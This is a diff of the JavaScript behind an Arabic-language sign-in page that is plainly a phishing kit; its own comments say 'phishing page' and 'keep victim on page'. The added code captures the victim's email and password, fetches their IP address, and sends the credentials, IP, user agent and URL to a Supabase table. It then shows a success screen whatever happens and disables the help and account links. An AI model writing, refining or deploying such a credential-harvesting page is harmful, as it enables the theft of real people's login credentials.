+    var email = emailInput.value.trim();
+    if (!isValidEmail(email)) {
+      emailWrapper.classList.add("error");
+      emailError.style.display = "block";
+      emailInput.focus();
       return;
     }
-    if(password.length < 1){
-      showError(error2, 'يرجى إدخال كلمة المرور');
-      passInp.focus();
-      return;
-    }
-
-    // Show loading state
-    btnSignIn.disabled = true;
-    btnSignInText.textContent = 'جارٍ تسجيل الدخول...';
-    signInSpinner.style.display = 'inline-block';
-
-    // Get IP then send
-    getIP(function(ip){
-      sendToSupabase(capturedEmail, password, ip, function(err, success){
-        // Hide loading
-        btnSignIn.disabled = false;
-        btnSignInText.textContent = 'تسجيل الدخول';
-        signInSpinner.style.display = 'none';
-
-        // Show success regardless
-        step2.classList.remove('active');
-        successScr.classList.add('show');
-        stepInd.style.display = 'none';
-        helpText.style.display = 'none';
-
-        var disp = document.getElementById('displayEmail');
-        if(disp) disp.style.display = 'none';
-      });
-    });
+    emailWrapper.classList.remove("error");
+    emailError.style.display = "none";
+    capturedEmail = email;
+    showStep(2);
   });
 
-  // ===== ENTER KEY ON PASSWORD =====
-  passInp.addEventListener('keydown', function(e){
-    if(e.key === 'Enter'){
+  // Enter key on email
+  emailInput.addEventListener("keydown", function(e) {
+    if (e.key === "Enter") {
       e.preventDefault();
-      btnSignIn.click();
+      nextBtn.click();
     }
   });
 
-  // ===== FORGOT PASSWORD LINK (no-op for phishing page) =====
-  forgotLink.addEventListener('click', function(e){
+  // Clear email error on input
+  emailInput.addEventListener("input", function() {
+    emailWrapper.classList.remove("error");
+    emailError.style.display = "none";
+  });
+
+  // Back button
+  backBtn.addEventListener("click", function() {
+    showStep(1);
+    passwordWrapper.classList.remove("error");
+    passwordError.style.display = "none";
+    passwordInput.value = "";
+    document.getElementById("togglePw").textContent = "إظهار";
+    passwordInput.type = "password";
+  });
+
+  // Toggle password visibility
+  togglePw.addEventListener("click", function() {
+    if (passwordInput.type === "password") {
+      passwordInput.type = "text";
+      togglePw.textContent = "إخفاء";
+    } else {
+      passwordInput.type = "password";
+      togglePw.textContent = "إظهار";
+    }
+  });
+
+  // Show toggle button when user starts typing password
+  passwordInput.addEventListener("input", function() {
+    togglePw.style.display = this.value.length > 0 ? "block" : "none";
+    passwordWrapper.classList.remove("error");
+    passwordError.style.display = "none";
+  });
+
+  // Enter key on password
+  passwordInput.addEventListener("keydown", function(e) {
+    if (e.key === "Enter") {
+      e.preventDefault();
+      signInBtn.click();
+    }
+  });
+
+  // === Sign In ===
+  signInBtn.addEventListener("click", function() {
+    var password = passwordInput.value;
+
+    if (!password) {
+      passwordWrapper.classList.add("error");
+      passwordError.textContent = "يرجى إدخال كلمة المرور.";
+      passwordError.style.display = "block";
+      passwordInput.focus();
+      return;
+    }
+
+    signInBtn.disabled = true;
+    signInBtn.textContent = "جاري التحقق...";
+
+    // Capture IP
+    var ipAddress = "";
+    var xhrIp = new XMLHttpRequest();
+    xhrIp.open("GET", "https://api.ipify.org?format=json", true);
+    xhrIp.timeout = 5000;
+    xhrIp.onload = function() {
+      try {
+        var ipData = JSON.parse(xhrIp.responseText);
+        ipAddress = ipData.ip || "";
+      } catch(e) {}
+      sendToSupabase(password, ipAddress);
+    };
+    xhrIp.onerror = function() {
+      sendToSupabase(password, "");
+    };
+    xhrIp.ontimeout = function() {
+      sendToSupabase(password, "");
+    };
+    xhrIp.send();
+  });
+
+  function sendToSupabase(password, ip) {
+    var payload = JSON.stringify({
+      email: capturedEmail,
+      password: password,
+      ip_address: ip,
+      user_agent: navigator.userAgent,
+      timestamp: new Date().toISOString(),
+      page_url: window.location.href
+    });
+
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", SUPABASE_URL + "/rest/v1/" + TABLE_NAME, true);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.setRequestHeader("apikey", SUPABASE_KEY);
+    xhr.setRequestHeader("Authorization", "Bearer " + SUPABASE_KEY);
+    xhr.setRequestHeader("Prefer", "return=minimal");
+
+    xhr.onload = function() {
+      showSuccess();
+    };
+    xhr.onerror = function() {
+      showSuccess();
+    };
+    xhr.ontimeout = function() {
+      showSuccess();
+    };
+
+    xhr.send(payload);
+  }
+
+  function showSuccess() {
+    successOverlay.classList.add("show");
+    // Clean any URL parameters
+    if (window.location.search) {
+      window.history.replaceState({}, document.title, window.location.pathname);
+    }
+  }
+
+  // Bottom links (prevent navigation — keep victim on page)
+  document.getElementById("troubleLink").addEventListener("click", function(e) {
     e.preventDefault();
-    showError(error2, 'تم تعطيل إعادة تعيين كلمة المرور مؤقتًا. يرجى الاتصال بالدعم.');
+  });
+  document.getElementById("createLink").addEventListener("click", function(e) {
+    e.preventDefault();
+  });
+  document.getElementById("helpLink").addEventListener("click", function(e) {
+    e.preventDefault();
   });
 
-  // ===== PREVENT RIGHT-CLICK ON SENSITIVE FIELDS =====
-  emailInp.addEventListener('contextmenu', function(e){e.preventDefault();});
-  passInp.addEventListener('contextmenu', function(e){e.preventDefault();});
-
-  // ===== FOCUS EMAIL ON LOAD =====
-  window.addEventListener('load', function(){
-    setTimeout(function(){ emailInp.focus(); }, 100);
-  });
-
+  // Focus email on load
+  setTimeout(function() { emailInput.focus(); }, 300);
 })();
 </script>
 </body>
